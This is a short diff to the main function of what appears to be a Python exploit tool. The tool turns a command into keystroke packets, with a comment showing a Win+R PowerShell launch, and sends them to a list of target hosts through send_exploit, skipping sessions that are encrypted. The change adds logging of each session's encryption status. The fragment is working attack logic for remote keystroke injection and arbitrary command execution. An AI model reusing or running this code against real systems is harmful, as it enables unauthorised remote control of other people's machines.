@@ -264,10 +264,11 @@ def main():
     cmd_pkts = parse_cmd(args.cmd) # parse_cmd("[WIN+R]powershell.exe[ENTER]{}[ENTER]".format(cmd))
     time.sleep(5)
     for target in args.targets:
-        if args.skip_encrypted and target_encrypted(target):
+        encrypted = target_encrypted(target)
+        if args.skip_encrypted and encrypted:
             _info("Skipping {} because of encryption".format(target))
             continue
-        _info("Executing '{}' against {} running on {}".format(args.cmd, target, args.os))
+        _info("Executing '{}' against {} running on {} ({})".format(args.cmd, target, args.os, 'Encrypted session' if encrypted else 'Unencrypted session'))
         send_exploit(cmd_pkts, target)
         
         
